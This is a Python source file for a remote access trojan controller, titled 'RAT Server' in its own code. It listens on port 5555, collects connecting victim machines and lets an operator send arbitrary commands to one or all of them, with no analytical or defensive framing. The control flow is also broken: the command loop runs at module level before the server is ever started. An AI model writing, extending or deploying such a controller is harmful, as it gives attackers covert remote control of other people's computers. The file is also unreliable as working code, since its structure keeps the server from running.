import socket # For network communication
import threading # For handling multiple clients concurrently
import os # For file system operations
from colorama import Fore # For colored terminal output
import platform # For OS detection

clients = {} # Dictionary to hold connected clients

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    
    # Update console title (Windows only)
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(f"RAT Server - Connected Clients: {len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} output]: {Fore.RESET} {response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"\n{Fore.RESET}[{Fore.RED}] Client {addr[0]} disconnected.")
    client_socket.close()
    del clients[addr]

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("clear")
    print("[*] waiting for clients to connect...")

while True:
    if not clients:
        continue

    print("\nConnected clients:")
    for idx, addr in enumerate(clients.keys(), start=1):
        print(f"{idx}. {addr[0]}:{addr[1]}")


    try:
        choice = int(input("Select a client to interact with (0 to refresh): "))- 1
    except ValueError:
            continue
    
    if choice == -1:
        command = input("Enter command to broadcast to all clients: ")
        for client_socket in clients.values():
            client_socket.send(command.encode())
    elif 0 <= choice < len(clients):
        target_addr = list(clients.keys())[choice]
        command = input (f"Enter command to send to {target_addr[0]}: ")
        clients[target_addr].send(command.encode())
    else:
        print("Invalid choice. Please try again.")

if __name__ == "__main__":
    start_server()

    
